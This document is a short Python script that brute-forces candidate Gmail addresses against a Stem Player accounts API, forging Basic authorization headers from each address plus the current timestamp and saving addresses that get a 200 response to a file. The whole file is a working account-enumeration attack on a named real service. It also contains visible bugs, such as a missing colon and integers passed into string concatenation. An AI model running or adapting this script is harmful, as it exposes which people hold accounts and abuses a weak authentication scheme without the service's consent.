import requests
import time
import base64
import string
import itertools
import sys

range_list = list(range(0, 16))
character_list = list(string.ascii_lowercase)
number_list = list(range(0, 99))
word_list = open("wordlist.txt","r").read().split("\n")
args = sys.argv

emails = []

def generate(l):
	for num_item in enumerate(range_list):
		yield from itertools.product(*([l] * num_item[0]))

def test(test_email):
		time.sleep(.5)
		email = test_email + "@gmail.com"
		timestamp = round(int(time.time()))
		authorization = email + ':' + str(timestamp)
		bytes = authorization.encode("utf-8")

		bytes = base64.b64encode(bytes)
		authorization = bytes.decode("utf_8")

		headers = {
			'Authorization': 'Basic ' + authorization
		}
		r = requests.get("https://api.stemplayer.com/accounts/access", headers=headers)
		if r.status_code == 200:
			print(email)
			emails.append(email)

for x in word_list:
		test(x)

for x in generate("abcdefghijklmnopqrstuvwxyz"):
		test(''.join(x))

for x in number_list:
		test(x)

if args[0]:
		for x in open(args[0],"r").read().split("\n")
			test(x)

with open('emails.txt', 'w') as f:
    for item in emails:
        f.write("%s\n" % item)
